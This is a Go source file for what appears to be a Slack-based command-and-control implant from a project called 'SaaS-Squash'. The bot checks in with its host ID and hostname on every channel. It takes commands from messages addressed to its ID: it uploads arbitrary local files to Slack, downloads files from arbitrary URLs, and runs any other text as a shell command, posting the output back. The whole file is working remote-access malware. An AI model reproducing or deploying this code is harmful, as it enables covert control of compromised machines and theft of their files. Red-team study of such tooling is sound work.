package slack

import (
	"SaaS-Squash/common"
	"io"
	"log"
	"net/http"
	"os"
	"strings"

	"github.com/slack-go/slack"
)

func StartRTM() {
	var api *slack.Client
	if common.AllC2Configs.Debug.Enable {
		api = slack.New(common.AllC2Configs.Slack.RTMAuthToken, slack.OptionDebug(true),
			slack.OptionLog(log.New(os.Stdout, "Slack RTM: ", log.Lshortfile|log.LstdFlags)))
	} else {
		api = slack.New(common.AllC2Configs.Slack.AuthToken,
			slack.OptionAppLevelToken(common.AllC2Configs.Slack.AppToken),
			slack.OptionLog(log.New(os.Stdout, "Slack RTM: ", log.Lshortfile|log.LstdFlags)))
	}

	rtm := api.NewRTM()
	go rtm.ManageConnection()
Loop:
	for {
		msg := <-rtm.IncomingEvents
		switch ev := msg.Data.(type) {
		case *slack.ConnectedEvent:
			common.AllC2Configs.Debug.LogDebug("Slack RTM - Connected ")
			channels, _, err := api.GetConversations(&slack.GetConversationsParameters{})
			if err != nil {
				common.AllC2Configs.Debug.LogDebugError("%s\n", err)
				break
			}
			for _, channel := range channels {
				common.AllC2Configs.Debug.LogDebug("Slack RTM - Channel ID: " + channel.ID + " Channel name: " + channel.Name)
				rtm.SendMessage(rtm.NewOutgoingMessage("Bot Checking in: "+common.AllC2Configs.UUID.HostID+" "+"HostName: "+common.AllC2Configs.UUID.HostName, channel.ID))
			}
		case *slack.MessageEvent:
			handleMessageEvent(api, ev, rtm)
		case *slack.RTMError:
			common.AllC2Configs.Debug.LogDebug("Error: " + ev.Error() + "\n")

		case *slack.InvalidAuthEvent:
			common.AllC2Configs.Debug.LogDebug("Slack RTM - Invalid Credentials ")
			break Loop
		default:
			// Ignore other events..
		}
	}
}

func handleMessageEvent(api *slack.Client, ev *slack.MessageEvent, rtm *slack.RTM) {

	if strings.HasPrefix(ev.Text, common.AllC2Configs.UUID.HostID) {

		//Trim whitespace and split the arguments
		command := strings.Split(strings.TrimSpace(strings.TrimPrefix(ev.Text, common.AllC2Configs.UUID.HostID)), " ")
		common.AllC2Configs.Debug.LogDebug("Slack RTM - Command: " + command[0] + "\n")
		switch {
		case strings.Contains(command[0], "chekin"):
			rtm.SendMessage(rtm.NewOutgoingMessage("Bot: "+common.AllC2Configs.UUID.HostID+" Hostname: "+common.AllC2Configs.UUID.HostName+"\n", ev.Channel))

		case strings.Contains(command[0], common.AllC2Configs.Slack.Upload):
			file, err := os.Open(command[1])
			if err != nil {
				common.AllC2Configs.Debug.LogDebugError("Failed to open file: ", err)
				return
			}
			defer file.Close()

			_, err = api.UploadFile(slack.FileUploadParameters{
				Reader:   file,
				Filename: command[1],
				Channels: []string{ev.Channel},
			})
			if err != nil {
				common.AllC2Configs.Debug.LogDebugError("Slack RTM - Failed to upload file: ", err)
			}

		case strings.Contains(command[0], common.AllC2Configs.Slack.Download):
			resp, err := http.Get(command[1])
			file := strings.Split(command[1], "/")
			if err != nil {
				common.AllC2Configs.Debug.LogDebugError("Slack RTM - Failed to download file: ", err)
				return
			}
			defer resp.Body.Close()

			out, err := os.Create(file[0])
			if err != nil {
				common.AllC2Configs.Debug.LogDebugError("Slack RTM - Failed to create file: ", err)
				return
			}
			defer out.Close()

			_, err = io.Copy(out, resp.Body)
			if err != nil {
				common.AllC2Configs.Debug.LogDebugError("Slack RTM - Failed to write file: ", err)
				return

			}
			rtm.SendMessage(rtm.NewOutgoingMessage("Bot: "+common.AllC2Configs.UUID.HostID+" sucsessfully downloaded file:"+command[1], ev.Channel))
		default:
			commands_joined := strings.Join(command, " ")
			output, err := common.ExecuteCommand(commands_joined)

			if err != nil {
				common.AllC2Configs.Debug.LogDebugError("Slack RTM - Failed to execute command: ", err)
				return
			}
			rtm.SendMessage(rtm.NewOutgoingMessage(output, ev.Channel))
		}

	}
}
